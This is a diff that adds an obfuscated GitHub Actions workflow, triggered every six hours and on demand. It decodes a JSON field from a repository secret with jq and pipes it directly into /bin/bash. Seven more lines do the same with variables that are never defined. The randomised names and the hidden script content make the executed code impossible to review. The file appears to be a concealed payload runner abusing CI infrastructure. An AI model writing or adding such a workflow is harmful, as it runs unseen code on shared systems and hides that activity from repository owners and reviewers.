@@ -1,0 +1,24 @@
+name: cunzaihenjibei
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '53 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: cunzaihenjibei
+        env:
+          cdmzt39794: ${{ secrets.cdmzt39794 }}
+        run: |
+          echo $cdmzt39794 | jq -r .iecku26 | /bin/bash
+          echo $vi14 | jq -r .f511 | /bin/bash
+          echo $qucy7 | jq -r .xbgd5 | /bin/bash
+          echo $b1715 | jq -r .wuajy45 | /bin/bash
+          echo $l7918 | jq -r .qho1923 | /bin/bash
+          echo $cj7 | jq -r .ea45049 | /bin/bash
+          echo $hbfgt446 | jq -r .c00795 | /bin/bash
+          echo $yxedv3251 | jq -r .ubse19440 | /bin/bash
+
